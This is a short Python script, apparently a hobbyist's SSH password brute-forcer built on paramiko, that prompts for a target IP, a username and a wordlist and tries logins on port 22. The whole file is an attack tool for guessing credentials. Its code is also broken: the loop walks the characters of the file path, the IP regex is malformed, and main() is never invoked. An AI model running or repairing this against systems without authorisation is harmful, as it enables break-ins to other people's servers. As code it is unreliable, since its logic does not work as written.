#!/usr/bin/python
import paramiko
import pyfiglet
import re


# Just Banner Function.
def intro():
    print("****************************************************************************")
    banner = pyfiglet.figlet_format("Amitzi's SSH BF")
    print(banner)
    print('This SSH Password Brute Forcer Script Written By Tal Amiri!')
    print("****************************************************************************")


ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
target_host = input('Please Enter IP Address: ')
user = input('Please Enter Username: ')
password = input('Please Enter Wordlist Path: ')
f = open(password, 'r')
regexIP = r'''^(25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)\.( 25[0-5]|2[0-4][
0-9]|[0-1]?[0-9][0-9]?)\.( 25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?) '''


# This functions checks if the ip valid.
def validate_ip(target_host2):
    while True:
        if re.search(regexIP, target_host2):
            print('{} Is Being Scanned.'.format(target_host2))
            return True

        else:
            print('{} Is invalid IP Address!'.format(target_host2))
            print('Run This Script Again With A Valid IP Address!')
            return False


# This function
def sh_bruteforce(password2):
    try:
        for passwd in password2:
            passwd = password2.replace('\n', '')
            ssh.connect(hostname=target_host, username=user, password=passwd, timeout=2, port=22)
            print('Login Successful With Username: {} And Password: {}'.format(user, passwd))
    except paramiko.ssh_exception.AuthenticationException:
        print('Trying...')
    except EOFError:
        print('EOF Error!')
    except Exception as err:
        print(err)


def main():
    intro()
    validate_ip(target_host)
    sh_bruteforce(password)
    f.close()


if __name__ == "__main__":
    print("SSHBrueForce.py is being run directly")
